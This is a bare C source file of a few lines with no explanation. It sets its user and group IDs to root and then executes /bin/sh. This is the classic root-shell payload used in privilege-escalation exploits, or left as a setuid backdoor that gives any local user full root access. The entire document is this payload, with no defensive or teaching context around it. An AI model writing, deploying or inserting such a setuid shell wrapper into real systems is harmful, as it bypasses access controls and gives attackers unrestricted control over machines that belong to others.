#include <unistd.h>

void main(void)
{

setuid(0);
setgid(0);		 	
execl("/bin/sh","sh",NULL); 	

}				

